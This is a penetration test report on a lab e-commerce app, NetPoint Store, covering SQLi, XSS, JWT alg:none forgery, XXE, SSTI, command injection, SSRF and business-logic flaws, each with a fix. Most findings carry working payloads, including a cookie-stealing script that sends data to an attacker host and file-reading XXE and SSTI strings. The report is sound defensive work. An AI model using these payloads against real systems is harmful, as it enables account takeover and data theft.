# Penetration Testing & Security Assessment Report: NetPoint Store Lab

**Target Application:** NetPoint Store (E-Commerce Web Application)  
**Date:** September 5, 2026  
**Assessment Type:** Grey-Box Web Application Penetration Test & Source Code Review  
**Assessment Lead:** Antigravity Security Advisory  
**Overall Risk Rating:** **CRITICAL (Risk Score: 9.8 / 10.0)**

---

## 1. Executive Summary

A comprehensive web application security assessment and source code audit was conducted on the **NetPoint Store** environment. The assessment evaluated the target across all primary OWASP Top 10 categories, focusing specifically on:
- **Reconnaissance & Information Disclosure**
- **Broken Access Control (BAC)**
- **SQL Injection (SQLi)**
- **Cross-Site Scripting (XSS)**
- **Broken Authentication & Session Management**
- **Security Misconfiguration**
- **XML External Entity (XXE) Injection**
- **Business Logic Flaws**
- Additional critical findings including **OS Command Injection**, **Server-Side Template Injection (SSTI)**, **Server-Side Request Forgery (SSRF)**, and **Arbitrary File Overwrite / RCE**.

### Findings Summary Matrix

| Severity | Count | Primary Impact Areas |
| :--- | :---: | :--- |
| 🔴 **Critical** | 9 | Remote Code Execution, Authentication Bypass, Mass Assignment, XXE, SSRF |
| 🟠 **High** | 7 | SQL Injection (Search & Blind 2nd-Order), Stored/Reflected XSS, IDOR, Price Manipulation |
| 🟡 **Medium** | 6 | Arbitrary Upload, Coupon Abuse, Race Condition, Exposed Metadata/Git, Predictable Reset |
| 🔵 **Low / Info** | 5 | Username Enumeration, Missing Headers, CORS with Credentials, Directory Listing, Outdated Deps |

---

## 2. Target Overview & Scope

- **Architecture:** Node.js Express application backed by MySQL 8 and an internal containerized service (`netpoint-inventory-sync`).
- **Core Files Audited:**
  - `src/app.js` (Express configuration, CORS, static routes, global error handling)
  - `src/routes/auth.js` (Authentication, registration, password reset)
  - `src/routes/products.js` (Catalog browsing, search, reviews)
  - `src/routes/orders.js` (Order history, invoice rendering, receipt generation)
  - `src/routes/profile.js` (Customer profile, avatar upload, password modification)
  - `src/routes/admin.js` (Back-office management, XML catalog import, user role management)
  - `src/routes/cart.js` (Cart operations, coupon application, checkout, loyalty points)
  - `src/routes/misc.js` (Contact form, diagnostic endpoints)
  - `src/middleware/auth.js` & `src/middleware/upload.js` (Session extraction, RBAC, file upload)
  - `src/util/jwtx.js` & `src/util/xmlparse.js` (JWT parsing/verification, legacy XML parser)

---

## 3. Detailed Vulnerability Assessment by Category

---

### Category 1: Reconnaissance & Information Disclosure

#### 1.1 Exposed Environment Variables & Source Code Repositories (`/.env`, `/.git/`)
- **Severity:** 🔴 Critical (CVSS: 9.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** `src/app.js:66` (`express.static(PUBLIC_DIR, { dotfiles: 'allow' })`), `src/public/.env`, `src/public/vcs-metadata/`
- **Technical Analysis:**
  The Express static file handler is configured with `{ dotfiles: 'allow' }`. This serves sensitive hidden configuration and version control files directly to unauthenticated clients:
  - `GET /.env` exposes database credentials (`DB_PASS=rootpw`), `SESSION_SECRET=netpoint_super_secret_2024`, and API keys.
  - `GET /.git/` exposes Git objects and commit logs. Reconstructing the commit history reveals previous hardcoded credentials in `server/config/default.js` and Stripe test keys.
  - Backup files such as `/config.js.old` and `/db_dump_old.sql.bak` are also publicly downloadable.
- **Proof of Concept:**
  ```bash
  curl -s http://localhost:9000/.env
  curl -s http://localhost:9000/config.js.old
  curl -s http://localhost:9000/.git/HEAD
  ```
- **Remediation:**
  Disable serving dotfiles in `express.static`, remove all `.env`, `.bak`, `.old`, and `.git` assets from the public root, and add them to `.gitignore` and `.dockerignore`.
  ```javascript
  app.use(express.static(PUBLIC_DIR, { dotfiles: 'ignore' }));
  ```

#### 1.2 Unauthenticated Diagnostic Endpoints (`/debug/status`, `/debug/logs`)
- **Severity:** 🟠 High (CVSS: 7.5 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/routes/misc.js:41-95`
- **Technical Analysis:**
  `/debug/status` dumps entire process environment variables (`process.env`), memory usage, database connection status, and OS platform information without authentication.
  `/debug/logs` streams the internal email delivery log (`mail.log`), leaking password-reset tokens generated for any customer or administrator.
- **Proof of Concept:**
  ```bash
  curl -s http://localhost:9000/debug/status | jq .environment_variables
  curl -s http://localhost:9000/debug/logs?lines=100
  ```
- **Remediation:**
  Remove debug endpoints from production code or restrict them with IP whitelisting and strict role-based authentication (`requireAdmin`).

#### 1.3 Directory Listing on Uploads Directory
- **Severity:** 🟡 Medium (CVSS: 5.3 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **Location:** `src/app.js:45-64`
- **Technical Analysis:**
  A custom middleware intercepts requests to `/uploads` and dynamically renders an HTML directory index of all files, exposing user avatar names, review attachments, and any arbitrarily uploaded files.
- **Remediation:**
  Delete lines 45–64 in `src/app.js` and serve static uploads without directory browsing.

---

### Category 2: Broken Access Control (BAC)

#### 2.1 Complete Bypass of Administrative Route Protection
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/middleware/auth.js:51-59`, `src/routes/admin.js:16`
- **Technical Analysis:**
  The `requireAdmin` middleware guards all `/admin/*` routes. However, its implementation only checks whether `req.user` exists:
  ```javascript
  function requireAdmin(req, res, next) {
    if (!req.user) {
      return res.redirect('/login?next=' + encodeURIComponent(req.originalUrl));
    }
    // VULN: Broken Access Control - only checks that visitor is logged in!
    next();
  }
  ```
  Any normal customer account can navigate to `/admin`, view full order history, modify or delete any customer account (`POST /admin/users/delete`), modify user roles (`POST /admin/users/role`), or import malicious catalog XML files.
- **Proof of Concept:**
  1. Register a standard user (`attacker@test.com`).
  2. Directly request `GET /admin` or `GET /admin/users`.
  3. Promote self to admin:
     ```http
     POST /admin/users/role HTTP/1.1
     Content-Type: application/json
     Cookie: session=<customer_session>

     {"id": 2, "role": "admin"}
     ```
- **Remediation:**
  Enforce strict role checking:
  ```javascript
  function requireAdmin(req, res, next) {
    if (!req.user) return res.redirect('/login?next=' + encodeURIComponent(req.originalUrl));
    if (req.user.role !== 'admin') return res.status(403).send('Forbidden');
    next();
  }
  ```

#### 2.2 Insecure Direct Object References (IDOR) on Orders & Receipts
- **Severity:** 🟠 High (CVSS: 7.5 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/routes/orders.js:24-33`, `src/routes/orders.js:54-60`
- **Technical Analysis:**
  When querying order invoices (`/orders/:id`) or downloading receipts (`/orders/:id/receipt`), the application checks that the user is logged in, but queries the database exclusively by `id = ?` without verifying `user_id = req.user.id` or administrative privileges:
  ```javascript
  const orders = await db.query('SELECT * FROM orders WHERE id = ?', [id]);
  ```
  Any customer can enumerate `#1001`, `#1002`, `#1003` to inspect private customer names, addresses, purchased items, and gift messages.
- **Remediation:**
  Verify order ownership:
  ```javascript
  const orders = await db.query(
    'SELECT * FROM orders WHERE id = ? AND (user_id = ? OR ? = "admin")',
    [id, req.user.id, req.user.role]
  );
  if (orders.length === 0) return res.status(404).render('404');
  ```

#### 2.3 Mass Assignment & IDOR on Profile Update
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/routes/profile.js:36-61`
- **Technical Analysis:**
  `POST /profile/update` allows updating fields including `role`, `balance`, and `points`. Furthermore, it extracts `targetId` from `req.body.id`:
  ```javascript
  const targetId = parseInt(req.body.id, 10) || req.user.id;
  await db.query(`UPDATE users SET ${updates.join(', ')} WHERE id = ?`, [...values, targetId]);
  ```
  A regular user can escalate their own account to `admin`, grant themselves unlimited store `balance`, or overwrite profile details for any other user on the system.
- **Proof of Concept:**
  ```http
  POST /profile/update HTTP/1.1
  Content-Type: application/json
  Cookie: session=<user_cookie>

  {
    "id": 1,
    "role": "admin",
    "balance": 99999.00
  }
  ```
- **Remediation:**
  Always bind updates to `req.user.id` and restrict `allowedFields` to non-privileged fields (`display_name`, `phone`, `address`).

---

### Category 3: SQL Injection (SQLi)

#### 3.1 Classic SQL Injection & Authentication Bypass on Login
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/routes/auth.js:31-39`
- **Technical Analysis:**
  User input is directly concatenated into the SQL query string:
  ```javascript
  const sql = `SELECT * FROM users WHERE email = '${email}' AND password_hash = MD5('${password}')`;
  rows = await db.raw(sql);
  ```
- **Proof of Concept:**
  Submitting `email: ' OR 1=1 -- -` with an arbitrary password results in:
  ```sql
  SELECT * FROM users WHERE email = '' OR 1=1 -- -' AND password_hash = MD5('...')
  ```
  This returns the first row in the table, instantly authenticating the attacker as the **administrator (UID 1)** without knowing credentials.
- **Remediation:**
  Use parameterized SQL queries:
  ```javascript
  const rows = await db.query(
    'SELECT * FROM users WHERE email = ? AND password_hash = MD5(?)',
    [email, password]
  );
  ```

#### 3.2 In-Band UNION / Error-Based SQLi in Catalog Search & Product ID
- **Severity:** 🟠 High (CVSS: 8.6 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/routes/products.js:18, 47`
- **Technical Analysis:**
  In `GET /products?search=...`, the `search` parameter is concatenated into:
  `sql += " AND (p.name LIKE '%" + q + "%' OR p.description LIKE '%" + q + "%')"`.
  Similarly, `GET /product/:id` concatenates `:id` directly into the `WHERE p.id = ${id}` clause.
- **Proof of Concept:**
  Extracting password hashes via UNION injection:
  ```http
  GET /products?search=%27%20UNION%20SELECT%201,email,password_hash,%27a%27,%27a%27,%27a%27,1,1,NOW(),%27x%27%20FROM%20users--%20- HTTP/1.1
  ```
  Time-based blind confirmation:
  ```http
  GET /product/1%20OR%20SLEEP(5) HTTP/1.1
  ```
- **Remediation:**
  Use parameterized queries:
  ```javascript
  sql += ' AND (p.name LIKE ? OR p.description LIKE ?)';
  values.push(`%${q}%`, `%${q}%`);
  ```

#### 3.3 Second-Order Blind SQL Injection in Profile Statistics
- **Severity:** 🟠 High (CVSS: 7.2 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/routes/profile.js:22-25`
- **Technical Analysis:**
  During account registration, `username` is safely inserted via parameters, but `GET /profile` concatenates `req.user.username` directly:
  ```javascript
  const stats = await db.raw(
    `SELECT COUNT(*) AS order_count FROM orders o JOIN users u ON u.id = o.user_id WHERE u.username = '${req.user.username}'`
  );
  ```
  Registering a username such as `' OR SLEEP(5)-- -` triggers a blind sleep delay every time `/profile` is accessed.
- **Remediation:**
  Parameterize the query:
  ```javascript
  const stats = await db.query(
    'SELECT COUNT(*) AS order_count FROM orders o JOIN users u ON u.id = o.user_id WHERE u.username = ?',
    [req.user.username]
  );
  ```

---

### Category 4: Cross-Site Scripting (XSS)

#### 4.1 Stored Cross-Site Scripting in Product Reviews
- **Severity:** 🟠 High (CVSS: 8.0 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N`)
- **Location:** `src/views/product.ejs:112` (`<%- r.body %>`), `src/routes/products.js:75`
- **Technical Analysis:**
  Reviews submitted via `POST /product/:id/review` are stored in the database without sanitization and rendered in `product.ejs` using raw EJS tags `<%- r.body %>`.
  Because the session cookie is configured with `httpOnly: false` (`src/routes/auth.js:17`), any attacker can inject a payload that steals the session cookies of visiting administrators or users:
  ```html
  <script>fetch('http://attacker-server/log?c='+encodeURIComponent(document.cookie))</script>
  ```
- **Remediation:**
  Use escaped EJS tags `<%= r.body %>` and enable `httpOnly: true` on cookies.

#### 4.2 Reflected Cross-Site Scripting in Catalog Search
- **Severity:** 🟡 Medium (CVSS: 6.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **Location:** `src/views/products.ejs:14` (`<%- q %>`)
- **Technical Analysis:**
  The `search` query parameter is reflected unescaped in `products.ejs`.
- **Proof of Concept:**
  ```
  http://localhost:9000/products?search=<script>alert(document.domain)</script>
  ```
- **Remediation:**
  Change `<%- q %>` to `<%= q %>` to ensure HTML encoding.

#### 4.3 Stored XSS via Unrestricted Media Upload
- **Severity:** 🟠 High (CVSS: 7.2 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`)
- **Location:** `src/middleware/upload.js:21-27`, `src/app.js:64`
- **Technical Analysis:**
  Customer file uploads (avatars/reviews) are checked only against a blacklist of executable extensions (`.php`, `.exe`, etc.). Files with extensions like `.html`, `.xhtml`, or `.svg` containing embedded scripts are accepted and served directly from `/uploads/<filename>` under the application origin.
- **Remediation:**
  Enforce strict MIME type validation, rename files to random UUIDs, and serve uploads with `Content-Disposition: attachment` or from a sandboxed domain.

---

### Category 5: Broken Authentication & Session Management

#### 5.1 Insecure JWT: `alg: none` Acceptance & Weak Secret
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/util/jwtx.js:41-55`
- **Technical Analysis:**
  The custom JWT implementation accepts unsigned tokens with `alg: "none"`:
  ```javascript
  if (header.alg === 'none') {
    return payload;
  }
  ```
  Additionally, the signed algorithm uses a weak hardcoded secret `netpoint_super_secret_2024`, and never checks token expiration (`exp`).
- **Proof of Concept:**
  An attacker can create a forged session cookie:
  - Header: `{"alg":"none","typ":"JWT"}` -> `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
  - Payload: `{"uid":1,"role":"admin","username":"admin"}` -> `eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifQ`
  - Forged Cookie: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.`
  Setting this cookie grants full administrative privileges without providing any password.
- **Remediation:**
  Use an industry-standard library (`jsonwebtoken`), reject `alg: none`, enforce strong asymmetric or 256-bit secrets loaded strictly from environment variables, and enforce expiration (`exp`).

#### 5.2 Predictable Password Reset Tokens & Token Leakage
- **Severity:** 🔴 Critical (CVSS: 9.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** `src/routes/auth.js:148-185`, `src/routes/misc.js:80-95`
- **Technical Analysis:**
  Password reset tokens are deterministically calculated as:
  `token = md5("${user.id}:${user.email}")`
  The token never expires, is never invalidated after use, and can be computed offline for any victim.
  Furthermore, whenever a reset email is triggered, the entire reset link is written to `mail.log`, which is unauthenticatedly readable via `/debug/logs`.
- **Proof of Concept:**
  For `emma.w@example.com` (UID 4):
  `token = md5("4:emma.w@example.com") = 47ca84313f8d0be4da71a629681ae803`
  Directly visiting `/reset?token=47ca84313f8d0be4da71a629681ae803` allows changing Emma's password.
- **Remediation:**
  Generate cryptographically secure random tokens (`crypto.randomBytes(32)`), store them hashed with expiration timestamps (15 minutes), and delete tokens immediately after use.

#### 5.3 Username Enumeration & Lack of Rate Limiting
- **Severity:** 🟡 Medium (CVSS: 5.3 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **Location:** `src/routes/auth.js:43-48, 137-140`
- **Technical Analysis:**
  The login and forgot-password endpoints return distinct error messages:
  - Account does not exist: `"No NetPoint account found with that email address."`
  - Account exists, wrong password: `"Incorrect password. Please try again."`
  There is no rate limiting or IP-based lockout implemented, enabling fast credential brute-forcing with tools such as Hydra or ffuf.
- **Remediation:**
  Return generic error messages (`"Invalid email or password"`) and implement `express-rate-limit`.

#### 5.4 Open Redirect
- **Severity:** 🟡 Medium (CVSS: 6.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **Location:** `src/routes/auth.js:54-56`
- **Technical Analysis:**
  The login redirect allows external URLs via protocol-relative format:
  `GET /login?next=//attacker.com`
- **Remediation:**
  Validate that `next` starts with a single `/` and does not begin with `//` or external domains.

---

### Category 6: Security Misconfiguration

#### 6.1 Unsalted MD5 Password Hashing
- **Severity:** 🟠 High (CVSS: 7.4 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/routes/auth.js:9-11`
- **Technical Analysis:**
  User passwords are stored as `crypto.createHash('md5').update(password).digest('hex')`. Unsalted MD5 hashes are trivially reversible via rainbow tables or GPU hash-cracking.
- **Remediation:**
  Migrate to `bcrypt` or `argon2id` with proper salting and cost parameters.

#### 6.2 Permissive CORS with Credentials
- **Severity:** 🟠 High (CVSS: 7.5 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
- **Location:** `src/app.js:18-31`
- **Technical Analysis:**
  The server reflects any incoming `Origin` header while setting `Access-Control-Allow-Credentials: true`:
  ```javascript
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  ```
  Any malicious website visited by an authenticated customer can execute cross-origin authenticated AJAX requests and read sensitive personal data.
- **Remediation:**
  Implement an explicit allow-list of trusted origins.

#### 6.3 Verbose Error Messages & Stack Traces
- **Severity:** 🟡 Medium (CVSS: 5.3 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **Location:** `src/app.js:88-95`
- **Technical Analysis:**
  When errors occur, raw stack traces and internal paths are displayed directly to clients whenever `DEBUG_ERRORS=true`.
- **Remediation:**
  Disable detailed errors in production environments and log stack traces exclusively server-side.

#### 6.4 Missing Security Headers
- **Severity:** 🔵 Low (CVSS: 4.3)
- **Location:** `src/app.js`
- **Technical Analysis:**
  The application lacks `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, and `Strict-Transport-Security`, leaving the application vulnerable to clickjacking and MIME-type confusion attacks.
- **Remediation:**
  Incorporate the `helmet` middleware.

---

### Category 7: XML External Entity (XXE) Injection

#### 7.1 Arbitrary File Disclosure via XML Catalog Import
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/util/xmlparse.js:30-63`, `src/routes/admin.js:167-224`
- **Technical Analysis:**
  The custom catalog import feature (`POST /admin/import`) parses XML documents and explicitly resolves external DTD entities:
  ```javascript
  function resolveExternal(uri) {
    let p = uri;
    if (p.startsWith('file://')) p = p.slice('file://'.length);
    return fs.readFileSync(path.normalize(p), 'utf8');
  }
  ```
  Combined with the broken admin access control flaw (§2.1), any logged-in user can submit an XML payload defining a `SYSTEM` entity pointing to `file:///etc/passwd` or `file:///app/src/public/.env`. The parsed content is inserted into the product name and reflected directly back in the HTTP response.
- **Proof of Concept:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE catalog [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <catalog>
    <product>
      <name>&xxe;</name>
      <price>1.00</price>
      <stock>10</stock>
    </product>
  </catalog>
  ```
- **Remediation:**
  Disable external entity resolution and DTD processing completely in XML parsers, or standardize on a JSON-only import API.

---

### Category 8: Business Logic Vulnerabilities

#### 8.1 Client-Controlled Pricing & Negative Totals (Store Credit Abuse)
- **Severity:** 🔴 Critical (CVSS: 9.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`)
- **Location:** `src/routes/cart.js:107-158`
- **Technical Analysis:**
  1. **Client Price Tampering:** `POST /checkout` trusts the client-provided `price` property in `req.body.items` instead of looking up the true product price from the `products` database table. A user can set `"price": 0.01` for any expensive item.
  2. **Negative Quantity & Balance Injection:** The application does not check that quantities are positive. Submitting a negative quantity (`qty: -10`) creates a negative subtotal. In lines 156–158:
     ```javascript
     if (total < 0 && Math.abs(total) > 0.001) {
       await db.query('UPDATE users SET balance = balance + ? WHERE id = ?', [-total, req.user.id]);
     }
     ```
     The server credits the absolute negative total directly into the user's cash `balance`, enabling users to generate unlimited store funds.
- **Proof of Concept:**
  ```http
  POST /checkout HTTP/1.1
  Content-Type: application/json
  Cookie: session=<user_cookie>

  {
    "items": [
      {"product_id": 1, "qty": -5, "price": 100.00}
    ]
  }
  ```
- **Remediation:**
  Always recalculate prices on the server by querying the database. Enforce `qty >= 1` and reject negative totals.

#### 8.2 Unlimited & Additively Stackable Coupons
- **Severity:** 🟠 High (CVSS: 7.5)
- **Location:** `src/routes/cart.js:133-152`
- **Technical Analysis:**
  Coupons can be submitted as a comma-separated list (`WELCOME10,STACK20,WELCOME10`). The application simply sums their `percent_off` without enforcing single-use restrictions or verifying `max_uses`. Submitting combinations that exceed 100% results in 100% free orders or negative totals.
- **Remediation:**
  Enforce a single coupon per checkout, validate `uses < max_uses`, and record redeemed coupons in a per-user audit table.

#### 8.3 Race Condition in Loyalty Points Redemption
- **Severity:** 🟡 Medium (CVSS: 5.3)
- **Location:** `src/routes/cart.js:199-222`
- **Technical Analysis:**
  `POST /account/redeem` performs a read-check-write pattern without database transactions or `FOR UPDATE` row locks:
  ```javascript
  const rows = await db.query('SELECT points, balance FROM users WHERE id = ?', [req.user.id]);
  // ... artificial 150ms delay ...
  await db.query('UPDATE users SET points = points - ?, balance = balance + ? WHERE id = ?', ...);
  ```
  Sending 10 concurrent redemption requests allows multiplying the cash value redeemed from a single pool of points.
- **Remediation:**
  Wrap point redemptions in an ACID transaction with pessimistic row locking (`SELECT points FROM users WHERE id = ? FOR UPDATE`).

---

### Category 9: Additional Critical Vulnerabilities (RCE & SSRF)

#### 9.1 OS Command Injection in Receipt Generation
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/routes/orders.js:64-78`
- **Technical Analysis:**
  The printable receipt generator formats an external shell command using string interpolation:
  ```javascript
  const msg = String(order.gift_message || '');
  const cmd = `node scripts/make_receipt.js --order ${order.id} --message "${msg}" ...`;
  exec(cmd, ...);
  ```
  A user who sets a gift note containing shell metacharacters (e.g. `"; touch /tmp/pwned #`) achieves immediate Remote Code Execution inside the container.
- **Remediation:**
  Avoid shelling out to external processes. If required, use `child_process.execFile` or `spawn` with an array of arguments, never `exec` with string concatenation.

#### 9.2 Server-Side Template Injection (SSTI) in Invoices
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/routes/orders.js:38-46`
- **Technical Analysis:**
  The order invoice renders the customer's gift message with `ejs.render(order.gift_message)`.
  Supplying an EJS expression executes arbitrary Node.js code:
  ```javascript
  <%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
  ```
- **Remediation:**
  Never pass unvalidated user input into template engine compiler functions.

#### 9.3 Server-Side Request Forgery (SSRF)
- **Severity:** 🔴 Critical (CVSS: 9.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** `src/routes/profile.js:97-120`, `src/routes/admin.js:90-108`
- **Technical Analysis:**
  `POST /profile/avatar-url` and `POST /admin/products/sync-image` issue HTTP requests to client-provided URLs via `axios.get(url)`. Non-image responses are previewed in the JSON output, allowing attackers to pivot into the internal Docker subnet:
  - `http://inventory-sync:4000/metrics` leaks internal AWS keys.
  - `http://inventory-sync:4000/debug/env` leaks internal service tokens and database DSNs.
- **Remediation:**
  Implement strict URL scheme allow-lists (HTTP/HTTPS only), resolve DNS hostnames before requesting, and block private/loopback IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).

#### 9.4 Arbitrary File Overwrite & Path Traversal via File Upload
- **Severity:** 🔴 Critical (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `src/middleware/upload.js:44, 73`
- **Technical Analysis:**
  `legacyUploadSingle` initializes Busboy with `preservePath: true` and concatenates `path.join(UPLOAD_DIR, filename)`. Submitting a multipart filename such as `../../views/404.ejs` writes directly into the application template directory, resulting in persistent RCE.
- **Remediation:**
  Strip directory paths using `path.basename(filename)` and generate randomized file names.

---

## 4. Remediation Roadmap & Priority Matrix

```mermaid
graph TD
    A[Remediation Plan] --> B[Phase 1: Immediate / 24-48 Hours]
    A --> C[Phase 2: Short Term / 1-2 Weeks]
    A --> D[Phase 3: Medium Term / 3-4 Weeks]

    B --> B1[Disable dotfiles in static middleware & delete debug endpoints]
    B --> B2[Patch requireAdmin to verify user.role === 'admin']
    B --> B3[Replace JWT parser with standard library & disable alg: none]
    B --> B4[Fix SQL string concatenations with parameterized queries]
    B --> B5[Fix Command Injection and SSTI in orders.js]

    C --> C1[Enforce server-side price & stock verification in checkout]
    C --> C2[Implement IDOR checks on all order routes]
    C --> C3[Disable external entity resolution in XML parser]
    C --> C4[Sanitize and escape all EJS outputs (Stored & Reflected XSS)]
    C --> C5[Migrate password hashes from MD5 to bcrypt]

    D --> D1[Add rate-limiting on auth endpoints]
    D --> D2[Implement Helmet security headers and strict CORS policy]
    D --> D3[Audit and update outdated npm dependencies]
```

---

## 5. Conclusion

The NetPoint Store application contains severe architectural and implementation vulnerabilities across all tested categories. An attacker can achieve complete system compromise through multiple independent vectors (SQL injection, unauthenticated JWT forgery, administrative access bypass, XXE, SSTI, and command injection).

Applying the recommended parameterized queries, robust role-based access control, cryptographic token generation, and server-side business logic validation will secure the application against these threats.
